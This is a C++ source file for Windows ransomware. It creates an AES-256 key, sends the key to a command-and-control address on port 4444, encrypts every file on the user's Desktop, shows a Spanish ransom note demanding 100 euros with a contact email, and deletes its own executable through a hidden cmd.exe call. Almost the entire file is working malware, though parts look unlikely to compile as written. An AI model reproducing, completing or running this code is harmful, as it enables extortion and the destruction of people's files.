// ransomware.cpp
#define _WIN32_WINNT 0x0600
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <string>
#include <vector>
#include <filesystem>
#include <fstream>
#include <sstream>
#include <thread>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "libcrypto.lib")
#pragma comment(lib, "libssl.lib")

namespace fs = std::filesystem;
constexpr char C2_IP[]   = "YOUR_C2_IP";
constexpr u_short C2_PORT= 4444;
constexpr char EMAIL[]   = "cotroneosalvador@gmail.com";
constexpr char RESCATE[] = "100 euros";

struct AESKey {
    unsigned char key[32];
    unsigned char iv[16];
};

void fatal(const char* msg) {
    MessageBoxA(nullptr, msg, "Error", MB_ICONERROR);
    ExitProcess(1);
}

void initWinsock() {
    WSADATA w;
    if (WSAStartup(MAKEWORD(2, 2), &w)) fatal("WSAStartup");
}

void sendKeyToC2(const AESKey& k) {
    initWinsock();
    SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
    if (s == INVALID_SOCKET) return;
    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_port   = htons(C2_PORT);
    inet_pton(AF_INET, C2_IP, &addr.sin_addr);
    if (connect(s, reinterpret_cast<sockaddr*>(&addr), sizeof(addr)) == 0) {
        send(s, reinterpret_cast<const char*>(k.key), sizeof(k.key), 0);
    }
    closesocket(s);
    WSACleanup();
}

void encryptFile(const fs::path& path, const AESKey& k) {
    std::ifstream in(path, std::ios::binary);
    if (!in) return;
    std::string plaintext(std::istreambuf_iterator<char>(in), {});
    in.close();
    int outLen = plaintext.size() + EVP_MAX_BLOCK_LENGTH;
    std::vector<unsigned char> outBuf(outLen);
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), nullptr, k.key, k.iv);
    int len;
    EVP_EncryptUpdate(ctx, outBuf.data(), &len,
                    reinterpret_cast<const unsigned char*>(plaintext.data()),
                    static_cast<int>(plaintext.size()));
    int finalLen;
    EVP_EncryptFinal_ex(ctx, outBuf.data() + len, &finalLen);
    EVP_CIPHER_CTX_free(ctx);
    std::ofstream out(path, std::ios::binary);
    out.write(reinterpret_cast<const char*>(k.iv), 16);
    out.write(reinterpret_cast<const char*>(outBuf.data()), len + finalLen);
}

void walkEncrypt(const fs::path& dir, const AESKey& k) {
    for (auto& p : fs::recursive_directory_iterator(dir)) {
        if (p.is_regular_file()) encryptFile(p.path(), k);
    }
}

void showRansom() {
    std::ostringstream msg;
    msg << "TUS ARCHIVOS HAN SIDO CIFRADOS\n"
        << "Contacta a " << EMAIL << "\n"
        << "Rescate: " << RESCATE << "\n"
        << "NO APAGUES EL PC";
    MessageBoxA(nullptr, msg.str().c_str(), "ATENCIÓN RANSOMWARE", MB_ICONWARNING | MB_TOPMOST);
}

int main() {
    AESKey k;
    RAND_bytes(k.key, sizeof(k.key));
    RAND_bytes(k.iv, sizeof(k.iv));

    fs::path desktop = fs::path(getenv("USERPROFILE")) / "Desktop";
    std::thread(sendKeyToC2, k).detach();
    walkEncrypt(desktop, k);
    showRansom();

    // autodestrucción simple
    TCHAR szPath[MAX_PATH];
    GetModuleFileName(nullptr, szPath, MAX_PATH);
    HANDLE h = CreateThread(nullptr, 0,
        [](LPVOID)->DWORD {
            Sleep(1000);
            ShellExecute(nullptr, "open", "cmd.exe",
                         (std::string("/c del /f /q \"") + szPath + "\"").c_str(),
                         nullptr, SW_HIDE);
            return 0;
        }, nullptr, 0, nullptr);
    CloseHandle(h);
    return 0;
}